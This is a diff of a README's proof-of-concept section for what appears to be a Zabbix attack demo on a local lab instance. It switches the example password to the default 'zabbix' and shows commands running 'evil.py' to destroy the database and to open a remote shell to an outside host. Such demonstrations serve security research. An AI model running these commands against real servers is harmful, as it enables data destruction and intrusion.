@@ -32,18 +32,18 @@ Follow the instructions in `./zabbix-simple/README.md`.
 
 ## Proof-of-concept
 
-If you set up an instance with "zabbix-simple" you should have installed [pyzabbix](https://pypi.org/project/pyzabbix/), a user called "User" with the role "Zabbix Admin". The password of this user is "something-secret".
+If you set up an instance with "zabbix-simple" you should have installed [pyzabbix](https://pypi.org/project/pyzabbix/), a user called "User" with the role "Zabbix Admin". The password of this user is the default password "zabbix".
 
 Destroy database:
 
 ```
-python evil.py --activate http://127.0.0.1:8080 User something-secret destroy-database
+python evil.py --activate http://127.0.0.1:8080 User zabbix destroy-database
 ```
 
 Remote shell connecting to myhost.example.com:8000:
 
 ```
-python evil.py --activate http://127.0.0.1:8080 User something-secret remote-shell myhost.example.com 8000
+python evil.py --activate http://127.0.0.1:8080 User zabbix remote-shell myhost.example.com 8000
 ```
 
 The trigger might need a few seconds/minutes to activate.
